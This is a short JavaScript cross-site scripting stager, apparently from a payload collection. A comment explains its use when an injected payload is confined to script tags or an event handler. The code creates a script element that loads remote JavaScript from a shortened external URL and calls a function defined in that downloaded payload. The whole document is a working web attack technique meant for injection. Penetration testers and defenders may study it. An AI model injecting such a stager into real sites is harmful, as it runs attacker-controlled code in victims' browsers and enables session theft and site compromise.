/*
Daniel Moore (https://twitter.com/0x0FEFF) sent me a great way to stage external JS code without injecting HTML.
In the event that your payload is stuck inside <script> tags, or an HTML event handler and you want to load an external JS resource, 
you can inject this snippet to stage a more complex payload from an external resource.

The external JS payload needs to be inside a function called "a" like this:

function a(){
  // payload here
  }

*/


var c=function(){
    a() // a() is defined in the script downloaded by the payload
};
var s=document.createElement('script');
s.src='//bit.ly/example';
s.onreadystatechange=c;
document.body.appendChild(s)

